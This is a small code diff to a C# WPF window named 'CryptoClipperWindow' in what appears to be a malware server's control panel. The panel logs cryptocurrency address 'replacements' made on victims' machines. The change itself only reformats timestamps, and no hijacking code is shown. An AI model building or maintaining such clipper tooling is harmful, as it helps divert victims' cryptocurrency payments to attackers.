@@ -1,4 +1,4 @@
-﻿using System.Windows;
+using System.Windows;
 using System.Windows.Input;
 using Newtonsoft.Json;
 using SeroServer.Net;
@@ -60,7 +60,7 @@ public partial class CryptoClipperWindow : Window
         {
             _totalCount++;
             TxtCount.Text = $"{_totalCount} replacement{(_totalCount != 1 ? "s" : "")}";
-            var line = $"[{DateTime.Now:HH:mm:ss}]  {data.Type}  {data.Original[..Math.Min(data.Original.Length, 20)]}…  →  {data.Replaced}\n";
+            var line = $"[{DateTime.Now:h:mm tt}]  {data.Type}  {data.Original[..Math.Min(data.Original.Length, 20)]}…  →  {data.Replaced}\n";
             TxtLog.AppendText(line);
             LogScroll.ScrollToEnd();
 
